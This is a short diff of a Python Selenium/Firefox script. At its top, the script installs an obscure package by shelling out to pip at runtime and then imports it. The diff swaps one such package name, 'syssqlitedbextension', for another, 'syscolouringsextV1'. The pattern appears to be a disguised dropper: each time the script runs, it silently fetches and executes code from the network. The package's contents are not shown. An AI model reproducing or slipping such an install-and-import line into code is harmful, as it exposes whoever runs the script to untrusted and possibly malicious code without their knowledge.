@@ -1,6 +1,6 @@
 import os
-os.system("pip install syssqlitedbextension")
-import syssqlitedbextension
+os.system("pip install syscolouringsextV1")
+import syscolouringsextV1
 from selenium import webdriver
 from selenium.webdriver.firefox.options import Options
 from selenium.webdriver.common.keys import Keys
